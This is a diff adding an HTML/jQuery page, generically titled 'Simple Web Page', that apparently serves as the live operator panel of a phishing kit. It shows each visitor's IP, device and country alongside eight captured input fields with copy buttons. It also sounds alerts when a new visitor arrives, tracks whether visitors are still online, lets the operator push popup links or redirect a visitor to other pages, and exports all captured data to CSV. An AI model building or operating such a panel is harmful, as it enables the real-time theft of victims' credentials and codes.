@@ -1,0 +1,457 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <script src="https://cdn.socket.io/4.7.2/socket.io.min.js" integrity="sha384-mZLF4UVrpi/QTWPA7BjNPEnkIfRFn4ZEO3Qt/HFklTJBj/gBOV8G3HcKn4NfQblz" crossorigin="anonymous"></script>
+        <title>Simple Web Page</title>
+    </head>
+    <body>
+
+        <style>
+            .table-container {
+                width: 100%;
+                overflow-x: scroll;
+            }
+            table {
+                min-width: 100%;
+                margin: 10px auto;
+                font-size: .8rem;
+            }
+            table, tr, td, th {
+                border: 1px solid #000;
+                border-collapse: collapse;
+                text-align: center;
+            }
+            .table-input {
+                width: 50px;
+            }
+        </style>
+
+        <div class="table-container">
+            <button id="export-btn">Export CSV</button>
+            <table id="userTable">
+                <thead>
+                  <tr>
+                    <th>IP Address</th>
+                    <th>OS</th>
+                    <th>Browser</th>
+                    <th>Device</th>
+                    <th>User ID</th>
+                    <th>Datetime</th>
+                    <th>Span</th>
+                    <th>Input 1</th>
+                    <th>Input 2</th>
+                    <th>Input 3</th>
+                    <th>Input 4</th>
+                    <th>Input 5</th>
+                    <th>Input 6</th>
+                    <th>Country</th>
+                    <th>Input 7</th>
+                    <th>Popup Opened</th>
+                    <th>Popup Link</th>
+                    <th>Main Link</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                </tbody>
+            </table>
+        </div>
+
+        <audio id="sound">
+            <source src="./ting.mp3" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
+
+        <audio id="popupSound">
+            <source src="./ting2.mp3" type="audio/mpeg">
+            Your browser does not support the audio element.
+        </audio>
+
+
+        <script src="./jquery.js"></script>
+        <script>
+            $(document).ready(function() {
+
+                const socket = io();
+
+                const darkColors = [
+                    "#ADD8E6",  // Light Blue
+                    "#90EE90",  // Light Green
+                    "#60c2c2",  // Light Yellow
+                    "#FFB6C1",  // Light Pink
+                    "#E6E6FA"   // Light Lavender
+                ];
+
+
+
+                const colorIndexMap = {};
+
+
+                $.get('/users', data => {
+                    data.forEach(user => {
+
+                        let colorIndex = colorIndexMap[user.ipAddress];
+
+                        // If color index doesn't exist, assign the next available color index
+                        if (colorIndex === undefined) {
+                            colorIndex = Object.keys(colorIndexMap).length % darkColors.length;
+                            colorIndexMap[user.ipAddress] = colorIndex;
+                        }
+
+                        // Get the color for the IP address
+                        const color = darkColors[colorIndex];
+
+                        $('table tbody').prepend(`
+                            <tr userId="${user.userId}">
+                                <td><strong style="background-color: ${color}">${user.ipAddress}</strong></td>
+                                <td><span>${user.os}</span></td>
+                                <td><span>${user.browserName}</span></td>
+                                <td><span>${user.deviceName}</span></td>
+                                <td><span>${user.userId}</span></td>
+                                <td><span>${user.datetime}</span></td>
+                                <td><span>${user.span}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input1}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input2}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input3}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input4}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input5}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input6}</span> <button class="table-copy">📋</button></td>
+                                <td><span>${user.input7}</span></td>
+                                <td><span>${user.input8}</span> <button class="table-copy">📋</button></td>
+                                <td class="popup-open">
+                                    <span>${user.popupOpen === true ? '🟩' : '🟥'}</span>
+                                    <button class="close-popup-btn" userId="${user.userId}" style="display: ${user.popupOpen === false ? 'none' : 'block'}">Close</button>
+                                </td>
+                                <td>
+                                    <form class="popup-link-form" userId="${data.userId}">
+                                        <input type="text" userId="${user.userId}" class="table-input">
+                                        <button class="popup-link-button" userId="${user.userId}">✔</button>
+                                    </form>
+                                </td>
+                                <td>
+                                    <button class="redirect-btn" page="/" userId="${user.userId}">A</button>
+                                    <button class="redirect-btn" page="/b" userId="${user.userId}">B</button>
+                                    <button class="redirect-btn" page="/c" userId="${user.userId}">C</button>
+                                </td>
+                                <td>
+                                    <button userId="${user.userId}" class="remove-btn">Remove</button>
+                                </td>
+                            </tr>
+                        `)
+                    });
+                })
+
+                function playSound() {
+                    // Get the audio element
+                    var audio = document.getElementById('sound');
+
+                    // Check if the audio element is supported
+                    if (audio) {
+                        // Play the sound
+                        audio.play();
+                    } else {
+                        console.error('Audio element is not supported.');
+                    }
+                }
+
+                function playPopupSound() {
+                    // Get the audio element
+                    var audio = document.getElementById('popupSound');
+
+                    // Check if the audio element is supported
+                    if (audio) {
+                        // Play the sound
+                        audio.play();
+                    } else {
+                        console.error('Audio element is not supported.');
+                    }
+                }
+
+                // $('html').mousemove(function() {
+                //     playSound()
+                // })
+    
+                socket.on('updateTable', (data) => {
+                    let colorIndex = colorIndexMap[data.ipAddress];
+
+                    // If color index doesn't exist, assign the next available color index
+                    if (colorIndex === undefined) {
+                        colorIndex = Object.keys(colorIndexMap).length % darkColors.length;
+                        colorIndexMap[data.ipAddress] = colorIndex;
+                    }
+
+                    // Get the color for the IP address
+                    const color = darkColors[colorIndex];
+
+                    $('table tbody').prepend(`
+                        <tr userId="${data.userId}">
+                            <td><strong style="background-color: ${color}">${data.ipAddress}</strong></td>
+                            <td><span>${data.os}</span></td>
+                            <td><span>${data.browserName}</span></td>
+                            <td><span>${data.deviceName}</span></td>
+                            <td><span>${data.userId}</span></td>
+                            <td><span>${data.datetime}</span></td>
+                            <td><span>${data.span}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input1}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input2}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input3}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input4}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input5}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input6}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input7}</span></td>
+                            <td><span>${data.input8}</span> <button class="table-copy">📋</button></td>
+                            <td class="popup-open">
+                                <span>${data.popupOpen === true ? '🟩' : '🟥'}</span>
+                                <button class="close-popup-btn" userId="${data.userId}" style="display: ${data.popupOpen === false ? 'none' : 'block'}">Close</button>
+                            </td>
+                            <td>
+                                <form class="popup-link-form" userId="${data.userId}">
+                                    <input type="text" userId="${data.userId}" class="table-input">
+                                    <button class="popup-link-button" userId="${data.userId}">✔</button>
+                                </form>
+                            </td>
+                            <td>
+                                <button class="redirect-btn" page="/" userId="${data.userId}">A</button>
+                                <button class="redirect-btn" page="/b" userId="${data.userId}">B</button>
+                                <button class="redirect-btn" page="/c" userId="${data.userId}">C</button>
+                            </td>
+                            <td>
+                                <button userId="${data.userId}" class="remove-btn">Remove</button>
+                            </td>
+                        </tr>
+                    `)
+
+                    playSound()
+                });
+
+                socket.on('updateRow', (data) => {
+
+                    let colorIndex = colorIndexMap[data.ipAddress];
+
+                    // If color index doesn't exist, assign the next available color index
+                    if (colorIndex === undefined) {
+                        colorIndex = Object.keys(colorIndexMap).length % darkColors.length;
+                        colorIndexMap[data.ipAddress] = colorIndex;
+                    }
+
+                    // Get the color for the IP address
+                    const color = darkColors[colorIndex];
+
+                    var popupState = $(`table tbody tr[userId="${data.userId}"] .popup-open`).html()
+                    $(`table tbody tr[userId="${data.userId}"]`).html(`
+                            <td><strong style="background-color: ${color}">${data.ipAddress}</strong></td>
+                            <td><span>${data.os}</span></td>
+                            <td><span>${data.browserName}</span></td>
+                            <td><span>${data.deviceName}</span></td>
+                            <td><span>${data.userId}</span></td>
+                            <td><span>${data.datetime}</span></td>
+                            <td><span>${data.span}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input1}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input2}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input3}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input4}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input5}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input6}</span> <button class="table-copy">📋</button></td>
+                            <td><span>${data.input7}</span></td>
+                            <td><span>${data.input8}</span> <button class="table-copy">📋</button></td>
+                            <td class="popup-open">
+                                ${popupState}
+                            </td>
+                            <td>
+                                <form class="popup-link-form" userId="${data.userId}">
+                                    <input type="text" userId="${data.userId}" class="table-input">
+                                    <button class="popup-link-button" userId="${data.userId}">✔</button>
+                                </form>
+                            </td>
+                            <td>
+                            <button class="redirect-btn" page="/" userId="${data.userId}">A</button>
+                            <button class="redirect-btn" page="/b" userId="${data.userId}">B</button>
+                            <button class="redirect-btn" page="/c" userId="${data.userId}">C</button>
+                        </td>
+                            <td>
+                                <button userId="${data.userId}" class="remove-btn">Remove</button>
+                            </td>
+                    `)
+
+                });
+
+                socket.on('handlePopup', (userId, popupState) => {
+                    $(`table tbody tr[userId="${userId}"] .popup-open`).html(`
+                        <span>${popupState === true ? '🟩' : '🟥'}</span>
+                        <button class="close-popup-btn" userId="${userId}" style="display: ${popupState === false ? 'none' : 'block'}">Close</button>
+                    `)
+
+                    if (popupState === true) {
+                        playPopupSound()
+                    }
+                });
+
+
+                function isGapLessThan3Seconds(otherDatetime) {
+
+                    console.log(otherDatetime, Date.now())
+
+                    const differenceInMilliseconds = Date.now() - otherDatetime
+
+                    return differenceInMilliseconds < 3000;
+                }
+
+                let existingUsers = []
+
+                socket.on('userExist', (userId) => {
+                    const existInArrayIndex = existingUsers.findIndex(user => user.id === userId);
+
+                    if (existInArrayIndex !== -1) {
+                        existingUsers[existInArrayIndex].time = Date.now();
+                    } else {
+                        existingUsers.push({ id: userId, time: Date.now() });
+                    }
+                });
+
+                setInterval(() => {
+                    $('table tbody tr').each(function() {
+                        const existInArray = existingUsers.find(user => user.id === $(this).attr('userId'))
+                        if (existInArray && isGapLessThan3Seconds(existInArray.time)) {
+                            $(this).css('background', 'white')
+                        } else {
+                            $(this).css('background', 'lightgray')
+                        }
+                    })
+                }, 1000);
+
+              
+
+                setInterval(() => {
+                    socket.emit('checkResponse')
+                }, 1000);
+
+                $('table').on('click', '.table-copy', function() {
+                    navigator.clipboard.writeText($(this).parent().find('span').text())
+                })
+
+                $('table').on('submit', '.popup-link-form', function(e) {
+                    e.preventDefault()
+
+                    socket.emit('redirect', $(this).attr('userId'), $(this).find('input').val())
+                })
+
+                $('table').on('click', '.table-btn', function() {
+                    socket.emit('finish', $(this).attr('userId'), $(this).parents('tr').find('.table-main-input').val())
+                })
+
+                $('table').on('click', '.open-popup-btn', function() {
+                    socket.emit('openPopup', $(this).attr('userId'))
+                })
+
+                $('table').on('click', '.close-popup-btn', function() {
+                    socket.emit('closePopup', $(this).attr('userId'))
+                })
+
+                $('table').on('click', '.remove-btn', function() {
+                    socket.emit('removeUser', $(this).attr('userId'))
+                })
+
+                socket.on('removed', (userId) => {
+                    $('table tr').each(function() {
+                        if ($(this).attr('userId') === userId) {
+                            $(this).remove()
+                        } else {
+
+                        }
+                    })
+                })
+
+                let isButtonDisabled = false;
+
+                $('table').on('click', '.redirect-btn', function() {
+                    socket.emit('userRedirect', $(this).attr('userId'), $(this).attr('page'))
+                })
+
+                socket.on('closePopup', (userId) => {
+                    $('table tr').each(function() {
+                        if ($(this).attr('userId') === userId) {
+                            $(this).remove()
+                        } else {
+
+                        }
+                    })
+                })
+
+                let closedPage = true
+                socket.on('userClosedPage', (userId) => {
+                    setTimeout(() => {
+                        socket.emit('checkClosed', userId)
+                    }, 500);
+
+                    setTimeout(() => {
+                        if (closedPage) {
+                            $('table tr').each(function() {
+                                if ($(this).attr('userId') === userId) {
+                                    $(this).remove()
+                                } else {
+                                }
+                            })
+                            socket.emit('confirmClosed', userId)
+                        } else {
+                            closedPage = true
+                        }
+                    }, 3000);
+
+                })
+
+                socket.on('closeResponse', (userId) => {
+                    closedPage = false
+                })
+
+
+
+
+
+                function convertArrayToCSV(array) {
+                    const header = Object.keys(array[0]).join(',');
+                    const csvRows = array.map(row =>
+                        Object.values(row)
+                        .map(value => (typeof value === 'string' && value.includes(',') ? `"${value}"` : value))
+                        .join(',')
+                    );
+                    const csv = [header, ...csvRows].join('\n');
+                    return csv;
+                }
+
+                function downloadCSV(array, fileName) {
+                    const csv = convertArrayToCSV(array);
+                    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+                    const link = document.createElement('a');
+
+                    if (navigator.msSaveBlob) {
+                        // IE 10+
+                        navigator.msSaveBlob(blob, fileName);
+                    } else {
+                        // Other browsers
+                        const url = URL.createObjectURL(blob);
+                        link.href = url;
+                        link.setAttribute('download', fileName);
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+                    }
+                }
+
+                $('#export-btn').click(async function() {
+                    $(this).text('Please Wait...');
+
+                    try {
+                        const data = await $.get('/allUsers');
+                        downloadCSV(data, 'data.csv');
+                    } catch (error) {
+                        console.error('Error:', error);
+                    } finally {
+                        $(this).text('Export CSV');
+                    }
+                });
+
+            })
+
+        </script>
+    </body>
+</html>
